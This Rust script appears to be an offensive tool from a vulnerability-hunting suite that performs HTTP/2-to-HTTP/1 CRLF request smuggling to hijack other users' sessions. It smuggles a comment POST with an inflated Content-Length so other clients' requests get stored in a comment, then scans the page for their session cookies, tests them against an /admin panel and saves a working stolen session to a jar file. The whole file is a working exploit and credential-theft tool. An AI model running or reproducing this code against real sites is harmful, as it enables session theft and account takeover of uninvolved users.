#!/usr/bin/env rust-script
//! name: h2_crlf_fill
//! description: H2->H1 CRLF-split victim-request capturer with a deterministic filler - arms a hungry smuggled `POST /post/comment` (over-long Content-Length) on an h2 stream, HOLDS the client connection open so the front-end keeps routing other clients' traffic into that pinned upstream connection, then completes the body with a padded filler stream of our own, reads the comment sink and extracts every session= value the victim's captured Cookie header leaked; verified sessions are written as an http_session jar. Deterministic where h2_crlf_capture waits for the victim's bytes to fill the body exactly.
//! version: 1.0.2
//! args: <base-url> [--sink /post?postId=1] [--post-id 1] [--over 700] [--gap-ms 700] [--wait-secs 0] [--rounds 40] [--read-ms 1500] [--verify-path /admin] [--out JAR] [--selftest]
//! keywords: 漏洞猎手套件, hunter, h2, http2, crlf, injection, request-splitting, request-smuggling, victim-capture, session-theft, comment-sink, hpack
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const DENIED_MARKER: &str = "only available if logged in as an administrator"; // binding-exempt: server response marker literal
/// Bytes the front-end writes after our injected header value on every downgraded
/// request (`\r\nVia: proxy1\r\nContent-Length: 0\r\n\r\n`) - measured from a
/// self-filled comment sink, and they land inside the smuggled request's body.
const APPENDED: usize = 35;

struct Opts {
    host: String,
    port: u16,
    sink: String,
    post_id: u64,
    over: usize,
    wait_secs: u64,
    gap_ms: u64,
    rounds: u32,
    read_ms: u64,
    read_every: u32,
    verify_path: String,
    out: Option<String>,
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let (provided, cl) = build_body("csrf=abc", 1, "MARKZZ", 100);
        let ok = provided.contains("comment=MARKZZ") && cl == provided.len() + APPENDED + 100;
        pi_rust_lib::report::success(
            "h2_crlf_fill",
            json!({"selftest": if ok { "ok" } else { "fail" }, "provided_len": provided.len(), "content_length": cl}),
            "run against the target base url",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut o = Opts {
        host: String::new(),
        port: 443,
        sink: "/post?postId=1".to_string(),
        post_id: 1,
        over: 700,
        wait_secs: 0,
        gap_ms: 700,
        rounds: 40,
        read_ms: 1500,
        read_every: 5,
        verify_path: "/admin".to_string(),
        out: None,
    };
    let mut i = 0;
    while i < args.len() {
        let next = |i: usize| args.get(i + 1).cloned();
        match args[i].as_str() {
            "--sink" => {
                if let Some(v) = next(i) {
                    o.sink = v;
                }
                i += 1;
            }
            "--post-id" => {
                o.post_id = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.post_id);
                i += 1;
            }
            "--over" => {
                o.over = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.over);
                i += 1;
            }
            "--wait-secs" => {
                o.wait_secs = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.wait_secs);
                i += 1;
            }
            "--gap-ms" => {
                o.gap_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.gap_ms);
                i += 1;
            }
            "--rounds" => {
                o.rounds = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.rounds).max(1);
                i += 1;
            }
            "--read-ms" => {
                o.read_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.read_ms);
                i += 1;
            }
            "--read-every" => {
                o.read_every = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.read_every).max(1);
                i += 1;
            }
            "--verify-path" => {
                if let Some(v) = next(i) {
                    o.verify_path = v;
                }
                i += 1;
            }
            "--out" => {
                o.out = next(i);
                i += 1;
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "h2_crlf_fill",
            "missing base url",
            "call as: h2_crlf_fill <base-url> [--over 700] [--gap-ms 700] [--rounds 40] [--out JAR]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    o.host = parsed.host_str().unwrap_or("").to_string();
    o.port = parsed.port().unwrap_or(443);

    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    match tokio::time::timeout(Duration::from_secs_f64(budget), run(&o)).await {
        Ok(Ok(data)) => {
            let next = if data["verified_session"].is_string() {
                "session stolen -> http_session with the written jar to reach /admin and act"
            } else {
                "no session in the captured bytes yet: raise --over / --wait-secs and rerun"
            };
            pi_rust_lib::report::success("h2_crlf_fill", data, next).unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2_crlf_fill", &e, "check the base url / the sink path");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure("h2_crlf_fill", &format!("deadline {budget}s reached"), "lower --rounds / --wait-secs");
            std::process::exit(1);
        }
    }
}

fn build_body(csrf: &str, post_id: u64, marker: &str, over: usize) -> (String, usize) {
    let provided = format!(
        "csrf={csrf}&postId={post_id}&name=vcap&email=vcap%40arm.test&website=http%3A%2F%2Fvcap.test&comment={marker}"
    );
    let cl = provided.len() + APPENDED + over;
    (provided, cl)
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn tls_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let mut tls = tls_connect(cfg, host, port).await?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn send_stream(
    tls: &mut TlsStream<TcpStream>,
    sid: u32,
    host: &str,
    path: &str,
    extra: &[(Vec<u8>, Vec<u8>)],
) -> Result<(), String> {
    let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    for (n, v) in extra {
        headers.push((n.clone(), v.clone()));
    }
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

/// Read frames until the target stream ends (or the idle window closes) - keeps one
/// decoder per connection so the HPACK dynamic table stays in sync.
async fn read_one(tls: &mut TlsStream<TcpStream>, dec: &mut hpack::Decoder<'_>, target: u32, read_ms: u64) -> Value {
    let mut status: Option<String> = None;
    let mut location: Option<String> = None;
    let mut len = 0usize;
    let mut sample = String::new();
    let mut ended = false;
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let flen = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; flen];
        if flen > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(hs) = dec.decode(&payload) {
                    if sid == target {
                        for h in hs.iter() {
                            let n: &[u8] = &h.0;
                            let v: &[u8] = &h.1;
                            if n == b":status" {
                                status = Some(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"location") {
                                location = Some(String::from_utf8_lossy(v).to_string());
                            }
                        }
                    }
                }
                if sid == target && flags & 0x1 != 0 {
                    ended = true;
                }
            }
            0 => {
                if sid == target {
                    len += payload.len();
                    if sample.len() < 60 {
                        sample.push_str(&String::from_utf8_lossy(&payload));
                    }
                    if flags & 0x1 != 0 {
                        ended = true;
                    }
                }
            }
            3 => {
                if sid == target {
                    ended = true;
                }
            }
            _ => {}
        }
        if ended {
            break;
        }
    }
    json!({"status": status, "location": location, "len": len, "snippet": sample})
}

async fn http1_get(cfg: Arc<ClientConfig>, host: &str, port: u16, path: &str, cookie: Option<&str>) -> Result<(u16, String, Vec<String>), String> {
    let mut tls = tls_connect(cfg, host, port).await?;
    let mut req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(12), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let status = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    let set_cookies: Vec<String> = head
        .lines()
        .filter(|l| l.to_ascii_lowercase().starts_with("set-cookie:"))
        .map(|l| l[11..].trim().to_string())
        .collect();
    Ok((status, body, set_cookies))
}

fn alnum_run_after(s: &str, idx: usize) -> String {
    let mut out = String::new();
    for c in s[idx..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    out
}

fn cookie_value(set_cookie: &str, name: &str) -> Option<String> {
    let needle = format!("{name}=");
    let idx = set_cookie.find(&needle)?;
    let v = alnum_run_after(set_cookie, idx + needle.len());
    if v.is_empty() {
        None
    } else {
        Some(v)
    }
}

fn extract_csrf(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\" value=\"")? + "name=\"csrf\" value=\"".len();
    let mut out = String::new();
    for c in html[idx..].chars() {
        if c == '"' {
            break;
        }
        out.push(c);
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

fn window(page: &str, idx: usize, back: usize, fwd: usize) -> String {
    let mut start = idx.saturating_sub(back);
    while start < page.len() && !page.is_char_boundary(start) {
        start += 1;
    }
    let mut end = (idx + fwd).min(page.len());
    while end > start && !page.is_char_boundary(end) {
        end -= 1;
    }
    page[start..end].to_string()
}

/// Every `session=<alnum>` value in the page except the caller's own.
fn scan_sessions(page: &str, self_session: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for (idx, _) in page.match_indices("session=") {
        let v = alnum_run_after(page, idx + "session=".len());
        if v.len() < 16 || v == self_session || out.iter().any(|(x, _)| *x == v) {
            continue;
        }
        out.push((v, window(page, idx, 200, 500)));
    }
    out
}

async fn run(o: &Opts) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let h2 = tls_config(&[b"h2"]);
    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    let deadline = Instant::now() + Duration::from_secs_f64((budget - 10.0).max(15.0));

    let mut rounds: Vec<Value> = Vec::new();
    let mut candidates: Vec<(String, String)> = Vec::new();

    // Seed material from the sink page: our own session + csrf so the smuggled
    // comment passes the writer's checks.
    let (seed_status, seed_body, set_cookies) = http1_get(h1.clone(), &o.host, o.port, &o.sink, None).await?;
    let session = set_cookies.iter().find_map(|c| cookie_value(c, "session")).unwrap_or_default();
    let csrf = match extract_csrf(&seed_body) {
        Some(t) => t,
        None => return Err(format!("no csrf token on {} (status {seed_status})", o.sink)),
    };
    // Markers must be unique per run: `page.find(marker)` would otherwise pick an older
    // comment left by a previous run that reused the same round number.
    let run_id = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() % 100000)
        .unwrap_or(0);

    for r in 1..=o.rounds {
        if Instant::now() >= deadline {
            break;
        }
        let marker = format!("V{run_id}R{r}Z");
        let (provided, cl) = build_body(&csrf, o.post_id, &marker, o.over);
        let smuggled = format!(
            "POST /post/comment HTTP/1.1\r\nHost: {}\r\nCookie: session={}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {cl}\r\n\r\n{provided}",
            o.host, session
        );
        let inject = format!("\r\n\r\n{smuggled}");

        let mut tls = h2_connect(h2.clone(), &o.host, o.port).await?;
        let mut dec = hpack::Decoder::new();
        send_stream(&mut tls, 1, &o.host, "/", &[(b"x-arm".to_vec(), inject.into_bytes())]).await?;
        let arm = read_one(&mut tls, &mut dec, 1, o.read_ms).await;

        // The gap is the window in which another client's request can be routed into
        // the upstream connection pinned to us and swallowed as our body. That pinned
        // connection is recycled once we go quiet for too long, so the attempt must
        // complete the body before that happens.
        let gap = if o.gap_ms > 0 { o.gap_ms } else { o.wait_secs * 1000 };
        tokio::time::sleep(Duration::from_millis(gap)).await;

        // Finish the body ourselves: the padded filler supplies the whole overhang when
        // the victim did not, so every attempt commits a comment we can inspect.
        // A single huge pad header is dropped by the front-end once the header list
        // grows (observed above ~1100 bytes), so the body never completes. Chunk the
        // pad across several streams instead: every chunk lands in the same pinned
        // upstream body and together they supply the whole overhang.
        let total = o.over + 400;
        let mut follow = json!({"status": null});
        let mut c = 0usize;
        while c * 600 < total {
            let sid = 3 + (c as u32) * 2;
            let take = total.saturating_sub(c * 600).min(600);
            let pad = vec![b'P'; take];
            match send_stream(&mut tls, sid, &o.host, "/", &[(b"pad".to_vec(), pad)]).await {
                Ok(()) => {
                    let row = read_one(&mut tls, &mut dec, sid, o.read_ms).await;
                    if row["status"].is_string() {
                        follow = row;
                    }
                }
                Err(e) => {
                    follow = json!({"error": e});
                    break;
                }
            }
            c += 1;
        }
        drop(tls);

        // Read the sink every `--read-every` rounds: a committed comment holds the
        // marker followed by whatever the front-end forwarded into the body (the
        // victim's raw request bytes). Reporting stays compact - the full window is
        // dropped from the envelope, only the capture's cookie lines survive.
        let mut sink_status = 0u16;
        let mut hits: Vec<(String, String)> = Vec::new();
        let mut marker_comment = String::new();
        if r % o.read_every == 0 || r == o.rounds {
            if let Ok((st, page, _)) = http1_get(h1.clone(), &o.host, o.port, &o.sink, None).await {
                sink_status = st;
                if let Some(mpos) = page.find(&marker) {
                    marker_comment = window(&page, mpos, 40, o.over + 1200);
                    hits = scan_sessions(&marker_comment, &session);
                }
                // A hit can sit in an earlier round's comment: sweep the whole page so a
                // capture is never missed just because the read cadence skipped its round.
                for (v, ctx) in scan_sessions(&page, &session) {
                    if !candidates.iter().any(|(x, _)| *x == v) {
                        candidates.push((v, ctx));
                    }
                }
                for (v, ctx) in hits.iter() {
                    if !candidates.iter().any(|(x, _)| x == v) {
                        candidates.push((v.clone(), ctx.clone()));
                    }
                }
            }
        }
        let mut cookie_lines: Vec<String> = Vec::new();
        let low = marker_comment.to_ascii_lowercase();
        let mut from = 0usize;
        while let Some(pos) = low[from..].find("cookie:") {
            let p = from + pos;
            cookie_lines.push(window(&marker_comment, p, 0, 300));
            from = p + 7;
            if cookie_lines.len() >= 3 {
                break;
            }
        }
        let victim_ua = marker_comment.contains("(Victim)");
        rounds.push(json!({
            "round": r,
            "marker": marker,
            "gap_ms": gap,
            "content_length": cl,
            "arm_status": arm["status"],
            "filler_status": follow["status"],
            "sink_status": sink_status,
            "marker_stored": !marker_comment.is_empty(),
            "victim_ua": victim_ua,
            "window_len": marker_comment.len(),
            "cookie_lines": cookie_lines,
            "session_candidates": hits.iter().map(|(v, _)| v.clone()).collect::<Vec<_>>(),
        }));
    }

    // Verify candidates: a captured credential is confirmed by reaching the admin panel
    // with it, so our own sessions harvested from the sink page are rejected here.
    let mut verified = json!({"verified": false});
    let mut jar: Option<String> = None;
    let mut captured: Option<Value> = None;
    let mut tested = 0u32;
    for (v, _ctx) in candidates.iter() {
        if tested >= 60 {
            break;
        }
        tested += 1;
        if let Ok((st, body, _)) = http1_get(h1.clone(), &o.host, o.port, &o.verify_path, Some(&format!("session={v}"))).await {
            let denied = body.contains(DENIED_MARKER);
            if st == 200 && !denied {
                captured = Some(json!({"session": v, "panel": window(&body, 0, 0, 300)}));
                verified = json!({
                    "verified": true,
                    "verify_path": o.verify_path,
                    "verify_status": st,
                    "panel_snippet": window(&body, 0, 0, 400),
                });
                if let Some(p) = &o.out {
                    let _ = std::fs::write(p, json!({ o.host.clone(): { "session": v } }).to_string());
                    jar = Some(p.clone());
                }
                break;
            }
        }
    }

    Ok(json!({
        "host": o.host,
        "sink": o.sink,
        "over": o.over,
        "gap_ms": if o.gap_ms > 0 { o.gap_ms } else { o.wait_secs * 1000 },
        "rounds_run": rounds.len(),
        "rounds": rounds,
        "candidates": candidates.len(),
        "candidates_tested": tested,
        "captured": captured,
        "verdict": verified,
        "jar": jar,
    }))
}
